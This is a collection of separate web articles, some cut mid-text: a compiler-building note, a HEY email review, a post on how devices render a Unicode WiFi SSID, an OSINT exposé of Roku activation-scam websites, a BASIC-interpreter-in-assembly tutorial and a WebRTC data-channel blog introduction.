<li>I write a set of grammar rules in Python, telling it how to turn tokens into AST instances, and feed them to RPly's parser</li>
<li>I write a compiler class which can turn each AST type into LLVM IR using llvm-lite</li>
</ul>
<p>Then, to compile some source code:</p>
<ul>
<li>The lexer turns my source into tokens</li>
<li>The parser turns tokens into AST</li>
<li>The compiler turns AST into IR, and dumps it to a file</li>
<li>I use the <code>llc</code> tool to compile from IR to an object file</li>
<li>I use <code>gcc</code> to compile that file into an executable</li>
</ul>
<p>Voila, a working program I can run. It can't do much without a standard library, but if I define
the grammar and AST for some "binary operations" like addition and substraction, I can compile
simple arithmetic and return or print the result.</p>
<p>What I'm trying to get at is that once you decide on a grammar for your language, most of the code you
write is glue, turning output from one library into input for another. Of course, this glue code
can get quite complex, but for the modern language developer, so much is already done for you and ready
to plug in. If you have some ideas for a language, it's never been easier to try them out.</p>

<p>After I got my HEY invite during its first week of launch, I started enjoying email again.</p>



<p>I now have a better email workflow using HEY than what I had using Gmail or Spark or even the Apple Mail app.</p>



<p>In this post, I’ll share my HEY workflow and talk about why I chose to pay $99/year for email.</p>



<h2 id="pay-using-data-or-money">Pay using data, or money</h2>



<p>Even before I came across this tweet from DHH, I was already paying for email.</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">The first brand-new product from us at Basecamp in many years is coming this April: An email service (not a client) built for people who both love and hate email. We'll fix the hate, and leave you with the love. Email is amazing, and it deserves our best. <a href="https://t.co/J7OCCTFX2Z">https://t.co/J7OCCTFX2Z</a></p>— DHH (@dhh) <a href="https://twitter.com/dhh/status/1225487645268160512?ref_src=twsrc%5Etfw">February 6, 2020</a></blockquote>
</div></figure>



<p>I had shifted from free email to a paid one on <a href="https://www.fastmail.com/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">Fastmail</a> back in December 2019.</p>



<p>There we two core reasons behind this decision:</p>



<ul><li><strong>Data privacy. </strong>It was time I stopped tech giants like Google from harvesting my personal and financial data for ads.</li><li><strong>Truly owning my email address.</strong> With a free email on a shared domain, you never truly own your email address. It’s just a rental that might vanish anytime the service provider wishes. Having my email on a custom domain meant I could hold that email address as long as I wished. Also, I could change providers anytime without changing my email address.</li></ul>



<figure><blockquote><p>If you’re not paying for a product, then you are the product.</p></blockquote></figure>



<p>With HEY, the first problem is solved. I’m paying them for their service which leaves out negligible motive for them to mine my data for profit.</p>



<p>And, HEY’s not cheap. It’s $99/year which comes down to $8.25/month. I was paying $5/month on Fastmail.</p>



<p>Apart from the super expensive Superhuman email client, HEY stacks up amongst the top-tier of email providers when it comes to pricing.</p>



<p>However, paying money doesn’t automatically mean they will not snoop on my data. I remember almost paying for <a href="https://otter.ai/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">Otter</a> and then quickly removing it from my phone when I went through <a href="https://blog.otter.ai/privacy-policy/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">their privacy policy</a>.</p>



<p>To dig deep, I went over HEY’s privacy policy, and it checked out. No major red flags.</p>



<p>I did say major because there were a couple of quirks including:</p>



<ul><li>Cookies to track user activity.</li><li>Not respecting a Do Not Track request.</li></ul>



<p>However, I can live with that.</p>



<p>But, what about the lecture on truly owning an email address?</p>



<p>It turns out; HEY offers that too.</p>



<p>Although, there is no support for custom domains as of now, they do commit to roll out the feature later this year.</p>



<p>Here’s a reply from DHH on my tweet:</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">No custom domains at launch. But a commitment to do them later this year 🤘</p>— DHH (@dhh) <a href="https://twitter.com/dhh/status/1265687931135524866?ref_src=twsrc%5Etfw">May 27, 2020</a></blockquote>
</div></figure>



<p>But, that’s not all. If you pay for at least one year of HEY which is $99, you get to keep your @hey.com email address, forever.</p>



<p>If I cancel my HEY account next year, I would still be able to receive emails on my @hey.com address if I choose to forward all incoming emails to a new address.</p>



<p>It seems pretty reasonable.</p>



<p>We receive a lot of emails, including sensitive ones like password reset and transaction logs on our email address. Being held hostage and asked to pay a ransom of $99/year just to keep the email address would have been unethical.</p>



<p>Although, I don’t want to move away from HEY anytime soon, this option seems like a good backup strategy.</p>



<h2 id="privacy-aside-i-also-love-hey-for-these-features">Privacy aside, I also love HEY for these features</h2>



<p>If HEY offered only privacy, I would have happily stuck to Fastmail. I was getting a good enough privacy-friendly email for half the price when paid yearly.</p>



<p>But, HEY’s more than just a privacy-friendly email.</p>



<p>Let’s start with:</p>



<h3 id="the-screener">The screener</h3>



<p>The screening feature is a game-changer for me.</p>



<p>I used to do all the hard work of making a filtering rule on my Gmail and Fastmail to weed out any unnecessary emails, but HEY makes it so easy.</p>

<p>Filtering out was a second step in my “konmari” inbox process. My first step was to unsubscribe manually or by using a tool like <a href="https://leavemealone.app/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">LeaveMeAlone</a>.</p>



<p>If I kept getting emails even after unsubscribing, I wrote filtering rules.</p>



<p>HEY screening is the reverse of what I was used to, and it made total sense. I regularly screen-in or screen-out emails and keep my actual email workspace tidy.</p>



<p>Instead of reacting to spammy senders, I am proactively blocking them out of my inbox.</p>



<p>For example, I recently subscribed to the <strong>Dense Discovery</strong> newsletter, and the verification email landed on my screener:</p>

<p>I have seen tweets about why the screener is only helpful for famous people who get tons of emails from unknown senders. I don’t think that’s the case.</p>



<p>This feature has been super helpful for me because I get spammed by a ton of agencies to buy their services.</p>

<p>What’s the worst part?</p>



<p>They usually don’t have unsubscribe links and often send the same email from different addresses.</p>



<p>Even the filters won’t permanently block these senders from reaching my inbox and cluttering it up.</p>



<p>With HEY, they never get past the screening list. If I ever change my mind about a sender, I can always screen them back in on the <a aria-label="undefined (opens in a new tab)" href="https://app.hey.com/my/clearances" target="_blank" rel="noreferrer noopener nofollow">Screener History page</a>.</p>



<p>For some people, screening might seem like a lot of work. For me, it’s an organising feature I love.</p>



<p>Talking about newsletters:</p>



<h3 id="the-feed-page-is-a-delight">The feed page is a delight</h3>



<p>HEY’s <a aria-label="undefined (opens in a new tab)" href="https://app.hey.com/feedbox" target="_blank" rel="noreferrer noopener nofollow">feed page</a> is how newsletters should be read.</p>



<p>We are already used to reading posts on social media in a linear feed. </p>



<p>Why not have the same approach for newsletters? They’re mostly like social media posts.</p>

<p>I usually visit this page 2-3 times a day and scan through the newsletters I receive.</p>



<p>Unlike Gmail or Spark, HEY doesn’t have a machine learning system to automatically sort emails into their respective folders.</p>



<p>Frankly, I would have enjoyed an automatic sorting process, but the manual sorting works for me as well. Maybe because I’m a neat-freak but well, what works, works.</p>



<p>To make sure newsletters land on the Feed page, you need to mark the sender’s delivery options on the sender’s contact page:</p>

<p>The same can also be <a aria-label="undefined (opens in a new tab)" href="https://youtu.be/UCeYTysLyGI?t=913" target="_blank" rel="noreferrer noopener nofollow">done on the screening page</a>. I usually sort emails on my screening page. It’s easier.</p>



<p>Another source of frequent emails which I don’t need to see right now are transaction logs.</p>



<p>With HEY:</p>



<h3 id="paper-trail-has-got-me-covered">Paper trail has got me covered</h3>



<p>For me, and I’m sure for a lot of you, transaction receipts are good for referring later on.</p>



<p>I don’t need to see them on my inbox. Neither do I need to read them right now.</p>



<p>The <a href="https://app.hey.com/paper_trail" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">paper trail page</a> in HEY does precisely that.</p>

<p>Marking a sender to deliver to paper trail (the same way we marked newsletters for feed), delivers all emails from them to a separate section out of my Imbox.</p>



<p>How is this any different from what Gmail does?</p>



<p>I don’t have to mark the emails as read. They are already in a read state.</p>



<p>I usually open this page up to verify a recent transaction.</p>



<p>Talking about transaction receipts:</p>



<h3 id="hey-has-a-central-place-for-attachments">HEY has a central place for attachments</h3>



<p>How this helps is I can view all attachments from a sender and filter by file type in a single page.</p>

<p>It’s useful in situations where you don’t precisely remember the particular email an attachment was on but know the who sent it to you.</p>



<p>I have had several such moments in the past. Probably that’s why this feature is so important to me.</p>



<p>Apart from these prominent features:</p>



<h3 id="i-like-how-i-can-reply-later-or-keep-aside-my-emails">I like how I can reply later or keep aside my emails</h3>



<p>Keep aside and reply later are those tiny features which fit into my workflow without disrupting it.</p>



<p>On my regular inbox with Gmail and Spark, I used to keep emails in my inbox, which I needed to refer or maybe reply to in some time.</p>



<p>This approach ensured I didn’t miss out on stuff that I need to get back to in the near future.</p>



<p>With HEY’s keep aside and reply later functionality, the organisation became a little easier and cleaner.</p>



<p>It’s what we software engineers call “separation of concerns”.</p>

Reply later, and 2. Keep aside</figcaption></figure></div>



<p>Some use cases where these features fit in:</p>



<ul><li><strong>Reply later: </strong>This is helpful when I know I need to get back with a response to an email, but now is not the correct time. I stash the email away to reply later and then reply when I have time.</li><li><strong>Keep aside</strong>: I find this useful for cases like waiting for a settlement to process or maybe some purchase that for which I’ll get a final confirmation a few days later.</li></ul>



<p>Also, there were times where I moved an email from keep aside to reply later when I didn’t hear back from the sender in a few days.</p>



<p>In a sense, both features go hand in hand to make your email processing easier.</p>



<p>It feels good not to have to apply hacks to get something done.</p>



<p>As <a aria-label="undefined (opens in a new tab)" href="https://twitter.com/jasonfried" target="_blank" rel="noreferrer noopener nofollow">Jason Fried</a> likes to say:</p>



<figure><blockquote><p>HEY is all about workflows, not workarounds.</p></blockquote></figure>



<p>Aside from all these great features, HEY is not a total joyride. It has its share of quirks.</p>



<h2 id="there's-room-for-improvement">There’s room for improvement</h2>



<p>HEY is still at a very early stage. Therefore, it’s safe to say that there will be a lot of iterations in the future, which will make the product even better.</p>



<p>As of now, here are the things about HEY that I don’t wholly enjoy:</p>



<h3 id="the-ui">The UI</h3>



<p>When I first saw HEY, I was convinced that I’d ditch it after a few days of use.</p>



<p>I’m more of a clean and sharp design kind of guy. HEY was playful and bold.</p>



<p>I was wrong.</p>



<p>After using HEY for about two days, the UI grew on me. The boldness and fun aspect of the UI made me excited about email once again.</p>



<p>I can’t remember when I was as excited to email someone as I am right now. Email is fun again.</p>



<p>There are still some parts of the UI that I haven’t been able to accept. One of them is the dark mode.</p>

July 3, 2020 | https://hamptonmoore.com/posts/weird-wifi-names-cont/ | <a href="https://web.archive.org/web/*/https://hamptonmoore.com/posts/weird-wifi-names-cont/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>This is a continuation of my previous post <a href="https://hamptonmoore.com/posts/weird-wifi-name-display/">Comparing how different devices display the SSID “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa”</a>. After posting it on HackerNews I got lots of feedback. The key one was something that I had sadly missed when I originally started this project. When the WiFi name of “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa” got shortened down to a one byte before the second “a” due to the 32 byte/octet limit of SSIDs. The issue was this character is actually two bytes wide, so the first part of the character stayed, with the second byte of it missing. The character in question was ◌̈́, with the hex codepoint cd84. Looking at the raw hex of the SSID you can see it ends in cd, <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc91cd</code>. For those curious about how that would be rendered on your device here it is “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝�”. After realizing this I decided my previous comparisons of how devices reacted to my weird unicode SSID was unfair. The SSID this time is “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝a” which is almost the exact same but that last two byte long character was replaced with an “a”. This was to keep the SSID at 32 octets long. Looking at the new hex of the SSID <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc9161</code> you can see that is is identical baring the <code>61</code> instead of a <code>cd</code> at the end.</p> <p>Below are the previous photos of the previous SSID “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝�” with the new SSID “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝a” under it. They are also grouped the same as previously to keep continuity.</p> <p>Galaxy S8 running Android 9 with Kernel 4.4.153 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/android.jpg" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/android.jpg" alt=""></p> <p>Amazon Firestick <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/firestick.jpg" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/firestick.jpg" alt=""></p> <p>As before the Galaxy S8 and the Firestick both handled it perfectly with there being no issues with how it rendered besides vertical cutoff which makes sense.</p> <p>iPhone running iOS 13.5.1 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/iphone-ios1351.jpg" alt=""> <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/iphone-ios1351.jpg" alt=""></p> <p>Apple TV Second Generation <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/appletvgen2.jpg" alt=""> <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/appletvgen2.jpg" alt=""></p> <p>These results were interesting. It showed that if the UTF-8 character in an SSID is invalid then IOS falls back to the <a href="https://en.wikipedia.org/wiki/Mac_OS_Roman">Mac OS Roman</a> character set, but since the new SSID is valid UTF-8 iOS properly renderers the SSID.</p> <p>2012 Macbook running High Sierra 10.13.6 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/macos.jpg" alt=""></p> <p>Unlike last time the Macbook actually showed the network.

Sadly the Vizio was not able to show the SSID and just fell back to escaped hex.</p> <p>The results from changing the SSID showed a couple things, namely devices really do not like it when they are given invalid or incomplete UTF-8 codes and lots of devices handle UTF-8 text much better than I thought they would. It also showed that some devices fallback to their native 8 bit encoding formats when they see an invalid UTF-8 codepoint, there is probably some room for exploitation here like inserting escape keys. I originally was not expecting the kindle to work at all, nor the chromebook after seeing the slew of question marks originally. Android was also found to be at handling text with invalid UTF-8 characters it just removed them as opposed to switching up formatting, falling back to hex, or erroring out with all question marks.</p> <p>Thank you to everyone who provided valuable feedback on the previous post. I have more research I plan ond doing with this in the future.</p> <p>Lastly if anyone would like to run this test themselves and send me the comparison results to be added my email is <code>me (at) hampton (This key &gt; not shifted) pw</code>.</p> <hr> <p> Hello reader. I do not normally like to put advertisements or promotions on my website, but recently a good friend of my Jaden Ann Scrivener died in a car crash. She was known in the community as the most caring and energetic person around. She was a beam of sunshine and happiness brightening up the day of anyone who interacted with her. If you could <a href="https://www.aplos.com/aws/give/RayofHopeMedicalMissionsInc/Jaden">please donate to her memorial fund</a>. All the proceeds will go to the <a href="https://www.rohmm.org/">Ray of Hope Medical Missions</a> which facilitates life-changing surgeries, reduces infant mortality, and provides mission opportunities locally. </p> </article></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
<p>New Roku and other streaming device users beware. These scammers are running a large network of lookalike websites tricking into paying “activation” or “set-up” fees for something coming free of charges.</p>
<p>How do these scams work? What Roku scam websites belong to the same circle of scammers? Read on to find out.</p>

<h2 id="how-the-scam-works">How the scam works</h2>
<p>The spiel is that if someone is trying to activate a streaming device and Googles <em>“Roku activation”</em>, paid ads would pop up within the search results all leading to the scammy sites.</p>
<div><blockquote><p lang="en" dir="ltr">Top 4 results on Google (in a private window with uBlock Origin disabled) are all fake sites which lead to 800 numbers to scammers. <a rel="nofollow noopener noreferrer" target="_blank" href="https://twitter.com/RokuSupport?ref_src=twsrc%5Etfw">@RokuSupport</a> needs to step in here and take these down. <a rel="nofollow noopener noreferrer" target="_blank" href="https://t.co/yzSoEzHfhx">pic.twitter.com/yzSoEzHfhx</a></p>— Michael | Unstable World (@esposimi) <a rel="nofollow noopener noreferrer" target="_blank" href="https://twitter.com/esposimi/status/1262432472794574855?ref_src=twsrc%5Etfw">May 18, 2020</a></blockquote>

</div>
<p>The <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.wave3.com/2020/05/15/bbb-warns-about-roku-activation-scam/">victims are then asked to pay</a> a one-off activation fee and/or a substantial charge for tech support services not required in the first place. Needless to say, these lookalike websites are not related to Roku in any capacity. <a rel="nofollow noopener noreferrer" target="_blank" href="https://support.roku.com/article/208757068">Roku device activation</a> at <em>roku.com/link</em> and general tech support from Roku is free of charge.</p>

</div>
<p>In sum, these lookalike websites are created and pushed on Google Ads to give the victims an impression that the website is associated with Roku and a payment fee is required to get started.</p>
<h2 id="same-scam-different-shill">Same scam different shill</h2>
<p>When I started to unravel this operation, what caught my eye was a single phone number. A <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.scammer.info/d/36984-888-990-4266-roku-activation">post on Scammer.info</a> and <a rel="nofollow noopener noreferrer" target="_blank" href="https://bobrtc.tel/numbers/d/888-990-4266-tech-support-scam">BobRTC</a> confirmed that <code>+1 888 990 4266</code> appear to be associated with Roku activation scams.</p>
<p>Then, a little research revealed that <code>+1 888 990 4266</code> is associated with two suspicious sites:</p>
<ul>
<li><code>rockstreamingmedia.com</code> (more about this later); and</li>
<li><code>cliqmediastream.com</code> (from the contact us page).</li>
</ul>
<div>
<p><a href="https://osint.fans/assets/images/cliqmediastream-contact-us.png" data-lightbox="identical-phone-numbers-linking-cliqmediastream-com-and-rockstreamingmedia-com-together" data-title="The top bar of cliqmediastream.com features +1 888 990 4266." data-alt="The top bar of cliqmediastream.com features +1 888 990 4266.">
<img src="https://osint.fans/assets/images/cliqmediastream-contact-us.png" alt="The top bar of cliqmediastream.com features +1 888 990 4266.">
</a>
<a href="https://osint.fans/assets/images/rockstreamingmedia-contact-us.png" data-lightbox="identical-phone-numbers-linking-cliqmediastream-com-and-rockstreamingmedia-com-together" data-title="Rokku Streaming Media also features +1 888 990 4266." data-alt="Rokku Streaming Media also features +1 888 990 4266.">

</a></p><figcaption>Identical phone numbers linking cliqmediastream.com and rockstreamingmedia.com together.</figcaption>
</div>
<p>Interestingly, <code>cliqmediastream.com</code> features two phone numbers. The top bar of <code>cliqmediastream.com</code> says the contact number is <code>+1 866 920 2601</code>. A little Google research reveals that <code>+1 866 920 2601</code> is also associated with a Roku scam running at <code>streamprosetup.com</code>, a similar site offering similar streaming device support and registration services.</p>
<div>
<figure>
<a href="https://osint.fans/assets/images/cliqmediastream-website.png" data-lightbox="did-cliqmediastream-com-forget-to-change-1-866-920-2601-in-the-top-bar" data-title="Did cliqmediastream.com forget to change +1 866 920 2601 in the top bar?" data-alt="Did cliqmediastream.com forget to change +1 866 920 2601 in the top bar?">

</a>
<figcaption>Did cliqmediastream.com forget to change +1 866 920 2601 in the top bar?</figcaption>
</figure>
</div>
<p>The conclusion is that <code>cliqmediastream.com</code>, <code>rockstreamingmedia.com</code> and <code>streamprosetup.com</code> all belong to the same circle because of the identical phone numbers.</p>
<h3 id="going-down-the-rabbit-hole">Going down the rabbit hole</h3>
<p>Let’s dig into other details now. The company address listed on <code>streamprosetup.com</code> is <code>2810 Crossroads Drive, Suite 4011, Madison, WI-53590</code>, which is a boring office block.</p>

<p>It turns out that a large number of sites posing as Roku support also feature the same address in Madison for one reason or the other:</p>
<div><div><pre><code>ashstreamservices.com
byarvitsolutions.com
linkmediasetup.com
roku-tvactivation.com
rokutvactivation.com

<div>

</a></p><figcaption>No matter what linking code is entered, the activation process always fails.</figcaption>
</div>
<p>The similarities do not stop here. I found a handful of other websites having similarities with each other. For example, the Privacy Policy, the (fake) service description and/or other textual blurbs are identical on these sites indicating that these sites belong to the same circle.</p>

<p>It is always exciting to have a new gadget at home. However, one should exercise great care when it comes to the initial setup and activation of the device. Scammers are setting up fake tech support sites and gaming the Google search results to get your money.</p>
<p>To avoid being scammed, always follow the on-screen instructions of your streaming device and never take shortcuts by doing a Google search for the setup page. If you are stuck, call the official tech support number of Roku or your streaming device brand.</p>
<p>What happens when a victim calls up one these support numbers? Here is an amusing video from Kitboga about his experience with a fake Roku tech support scam:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>It’s funny the rabbit holes one ends up. One of my personal projects for several years has been the creation (exploration, really) of a “fake emulator” — that is, an emulator for a computer that never existed all written in JavaScript. Instead, the machine would pay homage to the eight and sixteen bit machines of the 1980s and ‘90s.</p>
<p>I like to do things the hard way, though: this machine would also be based on a novel instruction set as well. The instruction set would be similar to that of the era, but also be a little easier to use. And so, <a href="https://github.com/kerrishotts/retroputer" rel="noopener nofollow noreferrer">Retroputer</a> was born. Over several years, the implementation has been built out and improved, although it’ll probably never be “complete” (it’s a personal exploration, after all).</p>
<p>Then @bbcmicrobot became a thing, and I wanted to be able to do a similar thing for Retroputer. My JS development skills are mostly in the arena of the front-end, and so this would be a cool way to get some more back-end skills. One problem: Retroputer could only understand its own assembly language. It had no BASIC support yet.</p>
<p>And so here I am, building a BASIC interpreter, ‘80s style — that is, entirely in assembly language, just like it used to be done. And I thought I’d share that journey, since it’s not often we delve into areas so far from our typical abstractions. My daily driver (JavaScript) makes a lot of things trivial and sometimes those things feel magical. Understanding the lowest levels of the process can often help with understanding those abstractions.</p>
<p>And so… let’s begin.</p>
<h2 id="parsing-in-low-level-assembly-language">Parsing in Low-Level Assembly Language</h2>
<p>When I wrote the assembler for Retroputer, I was able to use a really nice tool called Pegjs. This made quick work of the assembler’s custom syntax, but was unfortunately there’s nothing like it for Retroputer ASM.</p>
<p>Which means we have to do it the hard way.</p>
<p>Parsing actually occurs in multiple phases. A language that uses a compiler parses the code into an abstract syntax tree (or similar concept), and can then use that tree to generate the resulting native code. A consequence of this is that the program must be syntactically correct in order for the compilation to be successful.</p>
<p>Some interpreters today also have this concept because it’s often useful to generate the intermediate AST and execute from there than it is to execute from the original source.</p>
<p>But for a BASIC interpreter in a machine with limited resources, the most resource-effective way to parse is to do it in multiple phases — some of which occurs at run time. This means, however, that syntax errors often can’t be detected until the program is run and the area of code with the error is encountered.</p>
<p>The three phases of Retroputer BASIC parsing are as follows:</p>
<ol>
<li>Line Transformation</li>
<li>Tokenization</li>
<li>Runtime Syntax Checking</li>
</ol>
<p>The first two steps occur as the user enters a program (or loads one). The last one occurs while the program is running. Essentially, the first two build out the rough scaffolding of an airplane, but with no guarantee of flight. The last step is essentially acting as a test pilot — hoping you’ll get off the ground, but not knowing until you try.</p>
<p>Thankfully Retroputer BASIC doesn’t come with such dire consequences for raising an error during runtime.</p>
<p><em><strong>Note:</strong></em> Source code (in progress) for Retroputer BASIC is <a href="https://github.com/kerrishotts/retroputer/tree/master/asm/kernel/basic" rel="noopener nofollow noreferrer">available on GitHub</a>.</p>
<h2 id="line-transformation">Line Transformation</h2>
<p>This is the easiest part of the entire process. Essentially, the line that the user enters is converted to uppercase so that later processes are easier (and faster). BASIC is not sensitive to case, and so we can use that to our advantage.</p>
<pre><code>print 2+2
' becomes:
PRINT 2+2
</code></pre>
<p>Doing this in JavaScript is easy, right?</p>
<pre><code>theLine = theLine.toUpperCase();
</code></pre>
<p>But in assembly language, we have to be more detailed about how things get done. We need to read in a character, convert it to uppercase, and then store it somewhere.</p>
<pre><code>           ld  y,  0                # y is our index
_loop:     ld  al, [d, x, y]        # [d,x] is pointer to string
           cmp al, 97               # is al (char) in range?
           brs n   _continue        # Not a lowercase char; continue
           cmp al, 123              # high portion
           brs !n  _continue        # not a lowercase char; continue
           and al, 0b1101_1111      # uppercase!
           st  [d, x, y], al        # store back (we modify the original)
_continue: inc y                    # move our index along
           cmp al, 0                # check for NULL
           brs !z _loop             # No? Go back for more.
</code></pre>
<p>The above doesn’t quite match the same semantics as the JavaScript version. One important difference is that we now use Unicode to work with text, and so converting input from lowercase to uppercase can often be more difficult — and maybe impossible (depending on the language). Retroputer lives in the world of ASCII (rather, it’s own variation, named RetSCII), meaning that all supported characters are encoded into eight bits. This is woefully inadequate for many languages, but also true to the period.</p>
<p>It also means that we can use a nice feature of ASCII to convert from lowercase to uppercase. It turns out that uppercase “A” is represented with <code>65</code> in ASCII, and lowercase “a” is represented with <code>97</code>. If you’re familiar with your powers-of-two, that difference should catch your eye.</p>
<p>So it turns out that lowercase letters are represented with a number that’s exactly 32 above the uppercase letter. Once we know something’s in range, all we need to do is subtract 32!</p>
<p>That works, but we could just do some bit twiddling. For Retroputer this wouldn’t actually be any faster than subtraction, but avoiding subtraction means we don’t have to worry about the carry/borrow flag during arithmetic. It turns out we can use a bitwise <code>and</code> to turn off the bit for the 32 place value instead.</p>
<pre><code>and al, 0b1101_1111         # turn off bit in 32-place
# versus
clr c                       # clear carry
sub al, 32                  # subtract 32
</code></pre>
<p>But there’s a catch: not <em>everything</em> can be converted to uppercase. If the user has included a string literal, for example, we have to be more careful. After all, we don’t want Retroputer BASIC to scream at the user all the time, right? (Although many computers of the era didn’t have lowercase capability, Retroputer doesn’t share that same limitation.)</p>
<p>For example:</p>
<pre><code>print "Hello, World!"
' should become:
PRINT "Hello, World!"
' and not
PRINT "HELLO, WORLD!"
</code></pre>
<p>This means we need to keep track of whether or not we’re in the middle of a string literal. In BASIC, there’s only one signifier for this: the double quote. If we check if a character is a double quote, we can set a flag, and depending on the flag’s value, we can perform an uppercase operation or leave things alone.</p>
<p>It turns out that in JavaScript there’s no built-in to accomplish this, but we can build one:</p>
<pre><code>const len = theLine.length;
let insideString = false;
for (let i = 0; i &lt; len; i++) {
    const ch = theLine[i];
    if (ch === `"`) insideString = !insideString;
    if (!insideString) {
        const newCh = ch.toUpperCase();
        if (ch !== newCh) theLine[i] = newCh;
    }
}
</code></pre>
<p>Now the logic of the JS more closely matches that of the assembly version, although we’re taking advantage of JS’s unicode support a bit more.</p>
<p>The assembly version looks like this:</p>
<pre><code>           ld  y,  0                # y is our index
           ld  bl, 0                # === insideString (false)
_loop:     ld  al, [d, x, y]        # [d,x] is pointer to string
           cmp al, 34               # is al a double quote?
           brs !z  check_char       # no? should we uppercase it?
           xor bl, 0xFF             # yes? toggle insideString
_check_char:
           cmp bl, 0xFF             # inside a string?
           brs z   _continue        # yes? don't modify it
           cmp al, 97               # is al (char) in range? "a"
           brs n   _continue        # Not a lowercase char; continue
           cmp al, 123              # high portion           "z"
           brs !n  _continue        # not a lowercase char; continue
           and al, 0b1101_1111      # uppercase!
           st  [d, x, y], al        # store back (we modify the original)
_continue: inc y                    # move our index along
           cmp al, 0                # check for NULL
           brs !z _loop             # No? Go back for more.
</code></pre>
<p>So far all we’ve done is transform the input text to uppercase, but there’s one extra benefit here in the way we’ve had to track if we’re inside a string. We can do one round of syntax checking here!</p>
<p>If, at the end of the process we find that <code>inString</code> is still true (<code>bl = 0xFF</code>), we can trigger an error, because it means that there’s an unterminated string literal somewhere in the line.</p>
<p><em><strong>Side note:</strong></em> It turns out many BASICs are quite lenient when it comes to terminating quotes for strings. One of many things I learned while building my own interpreter. Even so, it doesn’t feel right to me, and so Retroputer BASIC doesn’t permit it.</p>
<h2 id="tokenization">Tokenization</h2>
<p>The next phase of parsing involves converting an entered line into something more efficient for Retroputer BASIC to execute. This is as close to the concept of an abstract syntax tree that we’ll get here — the result will definitely not be a tree. But it will be something that we can quickly evaluate during runtime.</p>
<p>One common feature of early microcomputers was a very limited memory capacity. Retroputer has more memory than most machines of the time had by default, but it still has much less than modern machines. As such, long BASIC programs could easily consume far too much memory if they were stored as the user typed them.</p>
<p>To save space, keywords are <em>tokenized</em> as the program is entered into memory. This process converts keywords into single-byte tokens. Keywords are always at least two bytes long, and so this savings can add up. It also means that we can use a lookup table during execution to call the appropriate assembly language routines.</p>
<p>Retroputer BASIC goes a little further than most BASICs of the time, …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>With the release of version 2.0, Ant Media Server Enterprise Edition supports WebRTC Data Channel standard and previously we posted 3 blog posts related to setup, usage and implementation of Data Channels with Ant Media Server EE:</p>
<ul>
<li><a href="https://antmedia.io/exchange-data-easily-using-webrtc-data-channels/">How to Exchange Data Easily Using WebRTC Data Channels with Ant Media Server</a></li>
<li><a href="https://antmedia.io/webrtc-chat-and-file-transfer/">WebRTC Chat and File Transfer Done Easily with Ant Media Server – Part 1</a></li>
<li><a href="https://antmedia.io/webrtc-chat-and-file-transfer-2/">WebRTC Chat and File Transfer Done Easily with Ant Media Server – Part 2</a></li>
</ul>
<p><a href="https://antmedia.io/exchange-data-easily-using-webrtc-data-channels/"></a>Our last blog post on this topic will be about sending control messages like actions and events through WebRTC Data Channels and about best practices when creating more interactive and complex applications through usage of these. We will examine 2 use case scenarios with some example usages from our Javascript and Android SDKs and try to make them more understandable for our customers.</p>
<p>Sending all kind of events or actions through data channels is the most convenient and secure way to implement interactive applications with WebRTC. Low latency and secure communication through Data Channels can be useful especially in case of interactive applications like in conferences, in e-learning or in some games where each participant has a certain role and allowed to do certain types of actions and can trigger certain events.</p>
<p><img src="https://antmedia.io/wp-content/uploads/2020/06/raising_hand-300x169.gif" alt="Build powerful interactive WebRTC Data Channel Applications with Actions and Events 1" width="423" height="238" srcset="https://antmedia.io/wp-content/uploads/2020/06/raising_hand-300x169.gif 300w, https://antmedia.io/wp-content/uploads/2020/06/raising_hand-1024x576.gif 1024w, https://antmedia.io/wp-content/uploads/2020/06/raising_hand-768x432.gif 768w, https://antmedia.io/wp-content/uploads/2020/06/raising_hand-600x338.gif 600w" sizes="(max-width: 423px) 100vw, 423px" title="Build powerful interactive WebRTC Data Channel Applications with Actions and Events 1"></p>
<p>For example in an e-learning application, a student can raise hand to ask a question and the teacher can decide to accept this request or reject it. If the request is accepted, the teacher and the other students will start playing the video stream of that student.</p>
<p>A similar scenario can also be realized for video conference applications of companies where the manager can allow employees to speak if requested during a presentation. Similarly voting on a subject during conferences or e-learning, communicating certain events like muted microphones, alerting or poking other users or sending game commands and events during WebRTC games can all be easily implemented through Data Channels.</p>
<h2>Message Format and Protocol</h2>
